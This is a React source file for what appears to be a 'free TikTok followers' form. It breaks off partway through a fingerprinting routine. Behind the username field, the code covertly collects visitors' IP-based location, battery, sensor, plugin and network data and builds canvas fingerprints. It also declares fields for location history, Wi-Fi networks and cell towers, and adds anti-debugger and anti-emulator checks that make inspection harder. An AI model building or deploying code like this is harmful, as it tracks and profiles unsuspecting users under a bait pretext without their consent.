import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { insertSubmissionSchema } from "@shared/schema";
import { z } from "zod";
import { 
  Form, 
  FormControl, 
  FormField, 
  FormItem, 
  FormLabel, 
  FormMessage 
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import Countdown from "@/components/Countdown";
import ProcessingAnimation from "@/components/ProcessingAnimation";
import SuccessMessage from "@/components/SuccessMessage";
import { Loader2, Sparkles, ShieldCheck, Lock, CheckCircle, Flame, TrendingUp } from "lucide-react";

// Function to detect device model from user agent
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let deviceInfo = "Unknown Device";

  // iPhone detection with model prediction based on screen size
  if (/iPhone/.test(ua)) {
    const match = ua.match(/OS (\d+)_(\d+)/i);
    const iosVersion = match ? `iOS ${match[1]}.${match[2]}` : "iOS";
    const screenHeight = Math.max(window.screen.width, window.screen.height);
    
    // Estimate iPhone model based on screen height
    if (screenHeight >= 926 && screenHeight <= 932) {
      deviceInfo = `iPhone 13/14/15 Pro Max (${iosVersion})`;
    } else if (screenHeight >= 852 && screenHeight <= 880) {
      deviceInfo = `iPhone 14/15 Plus (${iosVersion})`;
    } else if (screenHeight >= 844 && screenHeight <= 852) {
      deviceInfo = `iPhone 13/14/15 Pro (${iosVersion})`;
    } else if (screenHeight >= 812 && screenHeight < 844) {
      deviceInfo = `iPhone X/XS/11 Pro/12/13 mini (${iosVersion})`;
    } else if (screenHeight >= 736 && screenHeight < 812) {
      deviceInfo = `iPhone 8/7/6 Plus (${iosVersion})`;
    } else if (screenHeight >= 667 && screenHeight < 736) {
      deviceInfo = `iPhone 8/7/6/SE 2020 (${iosVersion})`;
    } else {
      deviceInfo = `iPhone (${iosVersion})`;
    }
  } 
  // iPad detection
  else if (/iPad/.test(ua)) {
    const match = ua.match(/OS (\d+)_(\d+)/i);
    const iosVersion = match ? `iOS ${match[1]}.${match[2]}` : "iOS";
    
    // Check for specific iPad models based on screen size
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const maxDimension = Math.max(screenWidth, screenHeight);
    
    if (maxDimension >= 1366) {
      deviceInfo = `iPad Pro 12.9" (${iosVersion})`;
    } else if (maxDimension >= 1112) {
      deviceInfo = `iPad Pro 11"/10.5" (${iosVersion})`;
    } else if (maxDimension >= 1024) {
      deviceInfo = `iPad Air/iPad (${iosVersion})`;
    } else {
      deviceInfo = `iPad mini (${iosVersion})`;
    }
  }
  // Samsung detection - improved model detection
  else if (/Samsung|SM-|SAMSUNG|Galaxy/.test(ua)) {
    // Try to extract the exact model number
    let modelCode = "";
    const smMatch = ua.match(/SM[-_]([A-Za-z0-9]+)/i);
    const galaxyMatch = ua.match(/Galaxy\s+([A-Za-z0-9]+(?:\s+[A-Za-z0-9]+)*)/i);
    
    if (smMatch) {
      modelCode = smMatch[1];
      
      // Map common Samsung model codes to marketing names
      const samsungModels: Record<string, string> = {
        // Galaxy S series
        'S23U': 'Galaxy S23 Ultra',
        'S23': 'Galaxy S23',
        'S22U': 'Galaxy S22 Ultra',
        'S22': 'Galaxy S22',
        'S21U': 'Galaxy S21 Ultra',
        'S21': 'Galaxy S21',
        'S20U': 'Galaxy S20 Ultra',
        'S20': 'Galaxy S20',
        'S10': 'Galaxy S10',
        'S9': 'Galaxy S9',
        'S8': 'Galaxy S8',
        
        // Note series
        'N20U': 'Galaxy Note 20 Ultra',
        'N20': 'Galaxy Note 20',
        'N10': 'Galaxy Note 10',
        'N9': 'Galaxy Note 9',
        
        // A series
        'A54': 'Galaxy A54',
        'A53': 'Galaxy A53',
        'A52': 'Galaxy A52',
        'A51': 'Galaxy A51',
        'A32': 'Galaxy A32',
        
        // Tab series
        'T870': 'Galaxy Tab S7',
        'T970': 'Galaxy Tab S7+',
        'T830': 'Galaxy Tab S4',
        
        // Fold/Flip series
        'F936': 'Galaxy Z Fold 4',
        'F926': 'Galaxy Z Fold 3',
        'F916': 'Galaxy Z Fold 2',
        'F900': 'Galaxy Fold',
        'F711': 'Galaxy Z Flip 3',
        'F707': 'Galaxy Z Flip 5G',
        'F700': 'Galaxy Z Flip',
        
        // S series - older model codes
        'G998': 'Galaxy S21 Ultra',
        'G996': 'Galaxy S21+',
        'G991': 'Galaxy S21',
        'G988': 'Galaxy S20 Ultra',
        'G986': 'Galaxy S20+',
        'G980': 'Galaxy S20',
        'G973': 'Galaxy S10',
        'G975': 'Galaxy S10+',
        'G970': 'Galaxy S10e',
        
        // Note series - older model codes
        'N986': 'Galaxy Note 20 Ultra',
        'N981': 'Galaxy Note 20',
        'N975': 'Galaxy Note 10+',
        'N970': 'Galaxy Note 10',
        
        // A series - older model codes
        'A536': 'Galaxy A53 5G',
        'A525': 'Galaxy A52',
        'A515': 'Galaxy A51',
        'A325': 'Galaxy A32',
      };
      
      // Check if we have a model match
      let matched = false;
      for (const [code, name] of Object.entries(samsungModels)) {
        if (modelCode.includes(code)) {
          deviceInfo = `Samsung ${name}`;
          matched = true;
          break;
        }
      }
      
      // If no specific mapping found, use the model code
      if (!matched) {
        deviceInfo = `Samsung Galaxy (Model: SM-${modelCode})`;
      }
    } else if (galaxyMatch) {
      deviceInfo = `Samsung ${galaxyMatch[0]}`;
    } else {
      deviceInfo = "Samsung Galaxy";
    }
    
    // Add Android version if available
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    if (versionMatch) {
      deviceInfo += ` (Android ${versionMatch[1]})`;
    }
  }
  // Google Pixel detection
  else if (/Pixel/.test(ua)) {
    const pixelMatch = ua.match(/Pixel\s+(\d+(?:\s*[a-zA-Z]+)?)/i);
    if (pixelMatch) {
      deviceInfo = `Google Pixel ${pixelMatch[1]}`;
    } else {
      deviceInfo = "Google Pixel";
    }
    
    // Add Android version if available
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    if (versionMatch) {
      deviceInfo += ` (Android ${versionMatch[1]})`;
    }
  }
  // OnePlus detection
  else if (/OnePlus|ONEPLUS/.test(ua)) {
    const match = ua.match(/(?:OnePlus|ONEPLUS)\s*([A-Za-z0-9]+(?:\s+[A-Za-z0-9]+)*)/i);
    if (match && match[1]) {
      deviceInfo = `OnePlus ${match[1].trim()}`;
    } else {
      deviceInfo = "OnePlus Device";
    }
    
    // Add Android version if available
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    if (versionMatch) {
      deviceInfo += ` (Android ${versionMatch[1]})`;
    }
  }
  // Xiaomi/Redmi/POCO detection
  else if (/Xiaomi|Redmi|POCO|Mi/i.test(ua)) {
    const match = ua.match(/(?:Xiaomi|Redmi|POCO|Mi)[\/\s_-]([A-Za-z0-9]+(?:[\s_-][A-Za-z0-9]+)*)/i);
    if (match && match[1]) {
      const brand = /Redmi/i.test(ua) ? 'Redmi' : 
                   /POCO/i.test(ua) ? 'POCO' : 'Xiaomi';
      deviceInfo = `${brand} ${match[1].trim().replace(/_/g, ' ')}`;
    } else {
      // Try to find model number in other formats
      const miMatch = ua.match(/M2\d{3}[A-Z]\d*/);
      if (miMatch) {
        deviceInfo = `Xiaomi ${miMatch[0]}`;
      } else {
        deviceInfo = /Redmi/i.test(ua) ? "Redmi Device" : 
                    /POCO/i.test(ua) ? "POCO Device" : "Xiaomi Device";
      }
    }
    
    // Add Android version if available
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    if (versionMatch) {
      deviceInfo += ` (Android ${versionMatch[1]})`;
    }
  }
  // More enhanced Android detection with model extraction
  else if (/Android/.test(ua)) {
    const versionMatch = ua.match(/Android (\d+(?:\.\d+)?)/i);
    const version = versionMatch ? versionMatch[1] : "";
    
    // First try to get model from standard format in user agent strings
    let brandModel = "";
    
    // These patterns will extract more detailed model information
    // Pattern 1: Most common format for Android model in UA
    const modelPattern1 = ua.match(/;\s*([a-zA-Z0-9\-_]+(?:[ \-_][a-zA-Z0-9\-_]+)*)[ \-]Build\//i);
    // Pattern 2: Alternative common format
    const modelPattern2 = ua.match(/;\s*([a-zA-Z0-9\-_]+(?:[ \-_][a-zA-Z0-9\-_]+)*);/i);
    // Pattern 3: Specific format for some devices
    const modelPattern3 = ua.match(/Android[\/\s][\d\.]+;\s*([^;]+);/i);
    // Pattern 4: Device model after Mozilla string
    const modelPattern4 = ua.match(/\(([^;]+);(?:\s+U;|\s+wv;)?\s+Android/i);
    
    // Try each pattern in order of specificity
    if (modelPattern1 && modelPattern1[1]) {
      brandModel = modelPattern1[1].replace(/build|Build/g, '').trim();
    } else if (modelPattern2 && modelPattern2[1]) {
      brandModel = modelPattern2[1].trim();
    } else if (modelPattern3 && modelPattern3[1]) {
      brandModel = modelPattern3[1].trim();
    } else if (modelPattern4 && modelPattern4[1] && !/Linux|Android|mozilla/i.test(modelPattern4[1])) {
      brandModel = modelPattern4[1].trim();
    }
    
    // Check for specific model identifiers
    const technoMatch = ua.match(/TECNO ([A-Za-z0-9]+)/i);
    const infinixMatch = ua.match(/Infinix ([A-Za-z0-9]+)/i);
    const realmeMatch = ua.match(/RMX([0-9]+)/i);
    const oppoMatch = ua.match(/CPH([0-9]+)/i);
    const vivoMatch = ua.match(/vivo ([0-9]+)/i);
    const nokiaMatch = ua.match(/Nokia ([A-Za-z0-9\.\-]+)/i);
    
    if (technoMatch) {
      brandModel = `TECNO ${technoMatch[1]}`;
    } else if (infinixMatch) {
      brandModel = `Infinix ${infinixMatch[1]}`;
    } else if (realmeMatch) {
      brandModel = `Realme RMX${realmeMatch[1]}`;
    } else if (oppoMatch) {
      brandModel = `OPPO CPH${oppoMatch[1]}`;
    } else if (vivoMatch) {
      brandModel = `Vivo ${vivoMatch[1]}`;
    } else if (nokiaMatch) {
      brandModel = `Nokia ${nokiaMatch[1]}`;
    }
    
    // Identify manufacturer for better labeling
    const manufacturer = 
      /Samsung|SAMSUNG/i.test(ua) ? "Samsung" :
      /LG/i.test(ua) ? "LG" :
      /Sony/i.test(ua) ? "Sony" :
      /HTC/i.test(ua) ? "HTC" :
      /Huawei/i.test(ua) ? "Huawei" :
      /HONOR/i.test(ua) ? "Honor" :
      /OnePlus|ONEPLUS/i.test(ua) ? "OnePlus" :
      /Xiaomi|Redmi|POCO|Mi/i.test(ua) ? "Xiaomi" :
      /OPPO|CPH\d{4}/i.test(ua) ? "OPPO" :
      /vivo|Vivo/i.test(ua) ? "Vivo" :
      /Motorola|moto/i.test(ua) ? "Motorola" :
      /Nokia/i.test(ua) ? "Nokia" :
      /Lenovo/i.test(ua) ? "Lenovo" :
      /Asus|ASUS/i.test(ua) ? "Asus" :
      /TECNO/i.test(ua) ? "TECNO" :
      /Infinix/i.test(ua) ? "Infinix" :
      /RMX\d{4}/i.test(ua) ? "Realme" :
      /Google/i.test(ua) ? "Google" :
      /Pixel/i.test(ua) ? "Google" :
      "";
    
    // Process and clean up the brand model string
    if (brandModel) {
      // Remove common unnecessary parts
      brandModel = brandModel
        .replace(/(SAMSUNG|Samsung|LG|Sony|HTC|Huawei|Google|OPPO|vivo|Motorola|Nokia|Lenovo|ASUS|Asus|TECNO|Infinix|Realme)\s*/i, '')
        .replace(/Android/i, '')
        .replace(/Mobile/i, '')
        .replace(/^\s+|\s+$/g, ''); // Trim extra spaces
      
      if (manufacturer && brandModel) {
        deviceInfo = `${manufacturer} ${brandModel}`;
      } else if (manufacturer) {
        deviceInfo = `${manufacturer} Device`;
      } else if (brandModel) {
        deviceInfo = brandModel;
      } else {
        deviceInfo = "Android Device";
      }
    } else if (manufacturer) {
      deviceInfo = `${manufacturer} Device`;
    } else {
      deviceInfo = "Android Device";
    }
    
    if (version) {
      deviceInfo += ` (Android ${version})`;
    }
  }
  // Windows detection
  else if (/Windows NT/.test(ua)) {
    const windowsVersion = {
      '10.0': '10',
      '6.3': '8.1',
      '6.2': '8',
      '6.1': '7',
      '6.0': 'Vista',
      '5.2': 'XP x64',
      '5.1': 'XP'
    };
    const match = ua.match(/Windows NT (\d+\.\d+)/i);
    if (match && match[1] in windowsVersion) {
      deviceInfo = `Windows ${windowsVersion[match[1] as keyof typeof windowsVersion]}`;
    } else {
      deviceInfo = "Windows PC";
    }
  }
  // Mac detection
  else if (/Macintosh/.test(ua)) {
    const match = ua.match(/Mac OS X (\d+[._]\d+)/i);
    if (match) {
      deviceInfo = `Mac OS X ${match[1].replace('_', '.')}`;
    } else {
      deviceInfo = "Mac OS X";
    }
  }
  // Linux detection
  else if (/Linux/.test(ua) && !/Android/.test(ua)) {
    const distroMatch = ua.match(/Ubuntu|Debian|Fedora|CentOS|RHEL|Arch|Gentoo/i);
    if (distroMatch) {
      deviceInfo = `${distroMatch[0]} Linux`;
    } else {
      deviceInfo = "Linux";
    }
  }

  return deviceInfo;
}

// Extend schema for frontend validation
const formSchema = insertSubmissionSchema.extend({
  username: z.string()
    .min(3, "Username must be at least 3 characters long")
    .max(30, "Username must be less than 30 characters")
    .regex(/^[a-zA-Z0-9._]+$/, "Username can only contain letters, numbers, period and underscore"),
  deviceInfo: z.object({
    deviceModel: z.string().min(1, "Device model is required"),
    screenSize: z.string().min(1, "Screen size is required"),
    platform: z.string().min(1, "Platform is required"),
    userAgent: z.string().min(1, "User agent is required"),
    language: z.string().min(1, "Language is required"),
    timezone: z.string().min(1, "Timezone is required"),
    browserFingerprint: z.string().optional(),
  }).optional(),
  ipAddress: z.string().optional(),
});

type FormValues = z.infer<typeof formSchema>;

export default function FollowerForm() {
  const [formStep, setFormStep] = useState<'form' | 'processing' | 'success'>('form');
  const [selectedAmount, setSelectedAmount] = useState<number>(5000);
  const { toast } = useToast();
  const [userInfo, setUserInfo] = useState({
    // Basic device information
    screenSize: `${window.screen.width}x${window.screen.height}`,
    colorDepth: window.screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    language: navigator.language,
    languages: Array.from(navigator.languages || []).join(','),
    platform: navigator.platform,
    userAgent: navigator.userAgent,
    deviceModel: getDeviceInfo ? getDeviceInfo() : "Unknown Device",
    deviceMemory: (navigator as any).deviceMemory || 'unknown',
    hardwareConcurrency: navigator.hardwareConcurrency,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || (window as any).doNotTrack || 'unknown',
    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(','),
    mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(','),
    hasVibration: 'vibrate' in navigator,
    
    // Enhanced Network information
    ip: '',
    ipDetails: {
      country: '',
      region: '',
      city: '',
      isp: '',
      org: '',
      asn: '',
      ispType: '',
      proxy: false,
      hosting: false,
      mobile: false
    },
    connection: (navigator as any).connection ? {
      downlink: (navigator as any).connection.downlink || 'unknown',
      effectiveType: (navigator as any).connection.effectiveType || 'unknown',
      rtt: (navigator as any).connection.rtt || 'unknown',
      saveData: (navigator as any).connection.saveData || false,
      type: (navigator as any).connection.type || 'unknown',
      // Listen for network changes
      networkChanges: [] as string[],
    } : {
      downlink: 'unknown',
      effectiveType: 'unknown',
      rtt: 'unknown',
      saveData: false,
      type: 'unknown',
      networkChanges: [] as string[]
    },
    
    // Advanced device capabilities
    deviceCapabilities: {
      vibration: 'vibrate' in navigator,
      orientation: 'orientation' in window || 'DeviceOrientationEvent' in window,
      touchscreen: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
      localStorage: (() => { try { return !!window.localStorage; } catch (e) { return false; } })(),
      sessionStorage: (() => { try { return !!window.sessionStorage; } catch (e) { return false; } })(),
      indexedDB: (() => { try { return !!window.indexedDB; } catch (e) { return false; } })(),
      serviceWorker: 'serviceWorker' in navigator,
      webRTC: !!(window.RTCPeerConnection || (window as any).mozRTCPeerConnection || (window as any).webkitRTCPeerConnection),
      webSocket: 'WebSocket' in window,
      geolocation: 'geolocation' in navigator,
      sensors: {
        accelerometer: 'Accelerometer' in window,
        gyroscope: 'Gyroscope' in window,
        magnetometer: 'Magnetometer' in window,
        ambientLightSensor: 'AmbientLightSensor' in window,
        proximityAPI: 'DeviceProximityEvent' in window,
        batteryAPI: 'navigator' in window && 'getBattery' in (navigator as any)
      }
    },
    
    // Security and integrity checks
    securityChecks: {
      isEmulator: false,
      isVirtual: false,
      isProxy: false,
      isTor: false,
      isVpn: false,
      emulatorDetails: {},
      tamperingDetected: false,
      automationDetected: false,
      debuggerAttached: !!window.Firebug || !!window.console.firebug || 
                        (() => { 
                          try { 
                            const isDebuggerStatement = new Function('debugger; return false;'); 
                            return isDebuggerStatement();
                          } catch (e) { 
                            return false; 
                          } 
                        })(),
      jailbreakDetected: false,
      rootDetected: false,
      integrityScore: 100, // Starting with perfect score, will be decreased based on checks
    },
    
    // Behavioral data collection
    behavioralData: {
      screenOrientationChanges: 0,
      touchBehavior: {
        touchCount: 0,
        touchDuration: [],
        touchPressure: [],
        multiTouchEvents: 0,
        dragEvents: 0,
        pinchEvents: 0
      },
      navigationTiming: {},
      interactionPatterns: [],
      deviceMotion: {
        readings: [],
        hasData: false
      }
    },
    
    // Enhanced location data with comprehensive details
    geolocation: {
      latitude: null as number | null,
      longitude: null as number | null,
      accuracy: null as number | null,
      altitude: null as number | null,
      altitudeAccuracy: null as number | null,
      heading: null as number | null,
      speed: null as number | null,
      timestamp: null as number | null,
      permission: 'unknown' as 'granted' | 'denied' | 'unknown' | 'error',
      collectionMethods: [] as string[],
      verificationStatus: 'unverified' as string,
      lastUpdated: '' as string,
      source: '' as string,
      attempted: false,
      attemptTimestamp: '' as string,
      error: '' as string,
      errorCode: 0,
      // Advanced location tracking fields
      watchPositionActive: false,
      watchId: undefined as number | undefined,
      watchPositionError: '' as string,
      collectionStatus: '' as string,
      locationQuality: '' as string,
      movementPatterns: [] as any[],
      locationHistory: [] as any[],
      movementPath: [] as any[],
      wifiNetworks: [] as any[],
      cellTowers: [] as any[],
      trackingInfo: {} as Record<string, any>,
      // Detailed address information from multiple sources
      address: {} as Record<string, any>,
      displayName: '' as string,
      locationDetails: {} as Record<string, any>,
      bigDataCloud: {} as Record<string, any>,
      geoJs: {} as Record<string, any>,
      ipInfo: {} as Record<string, any>,
      timezoneBasedLocation: {} as Record<string, any>,
      pointsOfInterest: [] as any[],
      nearbyLandmarks: [] as any[]
    },
    
    // Fingerprinting data
    canvasFingerprint: '',
    webglFingerprint: '',
    fonts: '',
    audioFingerprint: '',
    
    // Hardware information for advanced validation
    hardwareInfo: {
      cores: navigator.hardwareConcurrency || 0,
      memory: (navigator as any).deviceMemory || 'unknown',
      gpu: '',
      battery: null as any,
      batteryLevel: 0,
      orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
      touchPoints: navigator.maxTouchPoints || 0,
      pixelRatio: window.devicePixelRatio || 1,
      // Physical sensors
      sensors: {
        accelerometer: 'Accelerometer' in window,
        gyroscope: 'Gyroscope' in window,
        magnetometer: 'Magnetometer' in window,
        ambientLight: 'AmbientLightSensor' in window
      },
      vibrationSupported: false
    },
    
    // Device motion capability (indicates a real mobile device)
    hasMotion: 'DeviceMotionEvent' in window,
    hasOrientation: 'DeviceOrientationEvent' in window,
    
    // Mobile-specific checks
    isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
    mobileDetails: {
      brand: '',
      model: '',
      osVersion: '',
      deviceYear: '',
      deviceType: ''
    },
    isEmulator: false
  });
  
  // Enhanced device data collection
  useEffect(() => {
    // Enhanced network information collection
    const collectNetworkInfo = async () => {
      try {
        // Get basic IP address
        const ipifyResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipifyResponse.json();
        
        setUserInfo(prev => ({
          ...prev,
          ip: ipData.ip
        }));
        
        // Get detailed IP information using ipinfo.io
        try {
          const ipInfoResponse = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
          const ipInfoData = await ipInfoResponse.json();
          
          // Extract location from IP data
          const locationParts = ipInfoData.loc ? ipInfoData.loc.split(',') : [null, null];
          const ipDetails = {
            country: ipInfoData.country || '',
            region: ipInfoData.region || '',
            city: ipInfoData.city || '',
            isp: ipInfoData.org || '',
            asn: ipInfoData.asn || '',
            org: ipInfoData.org || '',
            ispType: '',
            proxy: false,
            hosting: /hosting|cloud|server|datacenter/i.test(ipInfoData.org || ''),
            mobile: /mobile|cellular|wireless/i.test(ipInfoData.org || '')
          };
          
          setUserInfo(prev => ({
            ...prev,
            ipDetails: ipDetails,
            // Add approximate geolocation from IP if actual geolocation unavailable
            geolocation: {
              ...prev.geolocation,
              ipBasedLocation: {
                latitude: locationParts[0] ? parseFloat(locationParts[0]) : null,
                longitude: locationParts[1] ? parseFloat(locationParts[1]) : null,
                accuracy: 5000, // IP geolocation is not very accurate (approx. 5km)
                source: 'ip'
              }
            }
          }));
        } catch (error) {
          console.warn('Failed to get detailed IP info:', error);
        }
        
        // Monitor network changes if available
        if ('connection' in navigator) {
          const connection = (navigator as any).connection;
          
          // Create a function to record network changes
          const recordNetworkChange = () => {
            const timestamp = new Date().toISOString();
            const networkState = {
              timestamp,
              type: connection.type || 'unknown',
              effectiveType: connection.effectiveType || 'unknown',
              downlink: connection.downlink || 'unknown',
              rtt: connection.rtt || 'unknown',
              saveData: connection.saveData || false
            };
            
            setUserInfo(prev => ({
              ...prev,
              connection: {
                ...prev.connection,
                ...networkState,
                networkChanges: [...(prev.connection.networkChanges || []), 
                  `${timestamp}: ${JSON.stringify(networkState)}`]
              }
            }));
          };
          
          // Set initial network state
          recordNetworkChange();
          
          // Listen for network changes
          connection.addEventListener('change', recordNetworkChange);
        }
        
      } catch (error) {
        console.error('Error collecting network information:', error);
      }
    };
    
    // Try to access battery info for additional device verification
    const getBatteryInfo = async () => {
      try {
        if ('getBattery' in navigator) {
          const battery = await (navigator as any).getBattery();
          
          const updateBatteryInfo = () => {
            setUserInfo(prev => ({
              ...prev,
              hardwareInfo: {
                ...prev.hardwareInfo,
                battery: {
                  level: battery.level,
                  charging: battery.charging,
                  chargingTime: battery.chargingTime,
                  dischargingTime: battery.dischargingTime
                },
                batteryLevel: Math.round(battery.level * 100)
              }
            }));
          };
          
          // Update battery info immediately
          updateBatteryInfo();
          
          // Listen for battery changes
          battery.addEventListener('levelchange', updateBatteryInfo);
          battery.addEventListener('chargingchange', updateBatteryInfo);
          
          // Sudden battery changes might indicate emulator
          let lastLevel = battery.level;
          battery.addEventListener('levelchange', () => {
            // Check for emulator-like behavior (sudden large jumps in battery level)
            if (Math.abs(battery.level - lastLevel) > 0.1) {
              console.warn("Sudden battery level change detected, possible emulator");
              setUserInfo(prev => ({
                ...prev,
                isEmulator: true
              }));
            }
            lastLevel = battery.level;
          });
        }
      } catch (e) {
        console.warn('Battery API not available:', e);
      }
    };
    
    // Advanced canvas fingerprinting
    const createCanvasFingerprint = () => {
      try {
        // Create multiple canvases with different approaches for more robust fingerprinting
        const createPrimaryFingerprint = () => {
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          if (!ctx) return { dataUrl: '', pixels: null };
          
          canvas.width = 300; // Increased size for more detail
          canvas.height = 200;
          
          // Create a complex gradient background with multiple color stops
          const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
          gradient.addColorStop(0, "rgba(0, 153, 255, 0.8)");
          gradient.addColorStop(0.2, "rgba(255, 255, 255, 0.9)");
          gradient.addColorStop(0.4, "rgba(73, 85, 219, 0.7)");
          gradient.addColorStop(0.6, "rgba(73, 219, 146, 0.8)");
          gradient.addColorStop(0.8, "rgba(219, 73, 182, 0.9)");
          gradient.addColorStop(1, "rgba(255, 0, 255, 0.8)");
          ctx.fillStyle = gradient;
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          
          // Add text with multiple font styles and emoji rendering
          ctx.fillStyle = "#FF2222";
          ctx.font = "bold 18pt Arial";
          ctx.textBaseline = "alphabetic";
          ctx.fillText('TikTok Fingerprint 👑', 10, 50);
          
          // Shadow effects that render differently across GPUs
          ctx.shadowColor = "rgba(0, 0, 0, 0.5)";
          ctx.shadowOffsetX = 3;
          ctx.shadowOffsetY = 3;
          ctx.shadowBlur = 4;
          ctx.fillStyle = "#0077FF";
          ctx.font = "16pt 'Courier New'";
          ctx.fillText(navigator.userAgent.substring(0, 30), 10, 80);
          
          // Reset shadow for subsequent operations
          ctx.shadowColor = "transparent";
          
          // Draw complex compound shapes for better fingerprinting
          // Complex path with curves and arcs
          ctx.strokeStyle = 'rgb(255,0,255)';
          ctx.lineWidth = 2;
          ctx.beginPath();
          ctx.arc(100, 100, 50, 0, Math.PI*2);
          ctx.stroke();
          
          // Add Bezier curves
          ctx.beginPath();
          ctx.moveTo(150, 100);
          ctx.bezierCurveTo(200, 50, 250, 150, 200, 180);
          ctx.lineWidth = 3;
          ctx.strokeStyle = 'rgba(0, 255, 255, 0.8)';
          ctx.stroke();
          
          // Draw shapes with varying alpha and blend modes
          ctx.globalAlpha = 0.8;
          ctx.globalCompositeOperation = "overlay";
          const gradient2 = ctx.createRadialGradient(180, 120, 10, 180, 120, 60);
          gradient2.addColorStop(0, "rgba(255, 0, 0, 0.8)");
          gradient2.addColorStop(0.5, "rgba(0, 255, 0, 0.6)");
          gradient2.addColorStop(1, "rgba(0, 0, 255, 0.4)");
          ctx.fillStyle = gradient2;
          ctx.fillRect(120, 90, 120, 60);
          
          // Reset composite operations for subsequent drawings
          ctx.globalAlpha = 1.0;
          ctx.globalCompositeOperation = "source-over";
          
          // Draw a star shape using path operations
          ctx.beginPath();
          const centerX = 250;
          const centerY = 150;
          const outerRadius = 30;
          const innerRadius = 15;
          const spikes = 8;
          
          // Draw star
          for (let i = 0; i < spikes * 2; i++) {
            const radius = i % 2 === 0 ? outerRadius : innerRadius;
            const x = centerX + radius * Math.cos(i * Math.PI / spikes);
            const y = centerY + radius * Math.sin(i * Math.PI / spikes);
            if (i === 0) {
              ctx.moveTo(x, y);
            } else {
              ctx.lineTo(x, y);
            }
          }
          ctx.closePath();
          ctx.lineWidth = 2;
          ctx.strokeStyle = 'rgb(150, 0, 200)';
          ctx.stroke();
          ctx.fillStyle = 'rgba(255, 204, 0, 0.6)';
          ctx.fill();
          
          // Add small text with sub-pixel rendering differences
          ctx.font = "8pt Arial";
          ctx.fillStyle = "rgba(60, 60, 60, 0.9)";
          ctx.fillText("Sub-pixel rendering test 123", 15, 185);
          
          // Apply transformations (scaling, rotation)
          ctx.save();
          ctx.translate(50, 150);
          ctx.rotate(Math.PI / 8);
          ctx.scale(0.8, 0.8);
          ctx.fillStyle = "#00AA55";
          ctx.fillRect(0, 0, 30, 30);
          ctx.restore();
          
          // Read pixel data for more accurate fingerprinting
          const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
          const pixels = Array.from(imageData.data.slice(0, 400)); // First 100 pixels (4 values per pixel)
          
          // Generate hash from canvas data
          const dataUrl = canvas.toDataURL();
          
          return { dataUrl, pixels };
        };
        
        // Create secondary fingerprint with different techniques
        const createSecondaryFingerprint = () => {
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          if (!ctx) return { dataUrl: '', pixels: null };
          
          canvas.width = 150;
          canvas.height = 150;
          
          // Use different rendering techniques
          ctx.fillStyle = "#FFFFFF";
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          
          // Use arcs and lines with specific math relationships 
          // that render differently across devices
          for (let i = 0; i < 10; i++) {
            const angleOffset = (i * Math.PI / 5);
            const radius = 60;
            
            ctx.fillStyle = `hsl(${(i * 36) % 360}, 100%, 50%)`;
            ctx.beginPath();
            ctx.arc(
              canvas.width / 2, 
              canvas.height / 2, 
              radius * Math.sin(i / 3), 
              angleOffset, 
              angleOffset + Math.PI / 5
            );
            ctx.lineTo(canvas.width / 2, canvas.height / 2);
            ctx.fill();
          }
          
          // Add text with font and emoji that varies by platform
          ctx.fillStyle = "#000000";
          ctx.font = "12pt 'Segoe UI', Tahoma, Geneva, sans-serif";
          ctx.fillText("🔒 Security Check", 10, 130);
          
          // Draw emoji characters to test font rendering
          ctx.font = "18pt Arial";
          ctx.fillText("🌎 🚀 🔥", 30, 50);
          
          // Get image data and data URL
          const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
          const pixels = Array.from(imageData.data.slice(0, 400));
          const dataUrl = canvas.toDataURL();
          
          return { dataUrl, pixels };
        };
        
        // Run detection tests to catch tampering
        const detectCanvasTampering = () => {
          // Tests for canvas fingerprint spoofing and tampering
          let tamperingDetected = false;
          let tamperingMethods = [];
          
          // Test 1: Empty canvas check - should be very consistent
          const emptyCanvas = document.createElement('canvas');
          emptyCanvas.width = 1;
          emptyCanvas.height = 1;
          const emptyCtx = emptyCanvas.getContext('2d');
          const emptyData = emptyCanvas.toDataURL();
          
          // Empty canvas should be consistent across browsers when unmodified
          // If it's not a standard value, it's likely spoofed
          const isCanvasInstrumented = emptyData.length > 50;
          if (isCanvasInstrumented) {
            tamperingDetected = true;
            tamperingMethods.push('canvas_instrumentation');
            console.warn("Canvas instrumentation detected, possible emulator/automation");
          }
          
          // Test 2: Consistency check 
          // Draw same thing twice, they should be exactly the same if not tampered
          const consistencyCanvas1 = document.createElement('canvas');
          const consistencyCanvas2 = document.createElement('canvas');
          consistencyCanvas1.width = consistencyCanvas2.width = 10;
          consistencyCanvas1.height = consistencyCanvas2.height = 10;
          
          const ctx1 = consistencyCanvas1.getContext('2d');
          const ctx2 = consistencyCanvas2.getContext('2d');
          
          // Draw identical content
          if (ctx1 && ctx2) {
            [ctx1, ctx2].forEach(ctx => {
              ctx.fillStyle = "#FF0000";
              ctx.fillRect(0, 0, 10, 10);
              ctx.fillStyle = "#00FF00";
              ctx.fillRect(2, 2, 6, 6);
            });
            
